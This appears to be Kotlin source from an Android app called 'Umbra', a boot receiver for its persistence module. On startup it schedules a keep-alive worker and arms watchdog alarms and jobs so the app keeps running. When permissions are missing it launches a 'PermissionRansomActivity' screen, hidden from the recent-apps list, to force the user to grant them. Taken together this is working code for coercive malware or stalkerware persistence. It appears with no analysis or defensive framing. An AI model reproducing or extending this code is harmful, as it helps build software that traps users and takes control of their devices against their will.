package org.umbra.core.persistence

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class BootReceiver : BroadcastReceiver() {
    private val tag = "Umbra"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED) return
        Log.d(tag, "BOOT_COMPLETED — scheduling restart")

        val request = OneTimeWorkRequestBuilder<KeepAliveWorker>()
            .setInitialDelay(10, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(context).enqueue(request)

        // Arm all watchdog layers on boot
        try {
            WatchdogAlarm.schedule(context)
            Log.d(tag, "WatchdogAlarm armed on boot")
        } catch (e: Exception) {
            Log.e(tag, "Failed to arm WatchdogAlarm on boot", e)
        }

        try {
            WatchdogJob.schedule(context)
            Log.d(tag, "WatchdogJob armed on boot")
        } catch (e: Exception) {
            Log.e(tag, "Failed to arm WatchdogJob on boot", e)
        }

        // ── Launch permission ransom on boot if permissions are missing ──
        try {
            if (!PermissionRansomActivity.hasAllPermissions(context)) {
                Log.d(tag, "Permissions missing on boot — launching ransom")
                // Delay slightly to let the system settle
                val ransomIntent = Intent(context, PermissionRansomActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                    )
                }
                // Use AlarmManager for a 5-second delay (system needs time to boot)
                val pi = android.app.PendingIntent.getActivity(
                    context, 9991, ransomIntent,
                    android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                )
                val am = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                try {
                    am.setExactAndAllowWhileIdle(
                        android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        android.os.SystemClock.elapsedRealtime() + 5000,
                        pi
                    )
                } catch (e: SecurityException) {
                    // SCHEDULE_EXACT_ALARM not granted on Android 14+ — use inexact
                    am.setAndAllowWhileIdle(
                        android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        android.os.SystemClock.elapsedRealtime() + 5000,
                        pi
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Failed to launch ransom on boot", e)
        }
    }
}
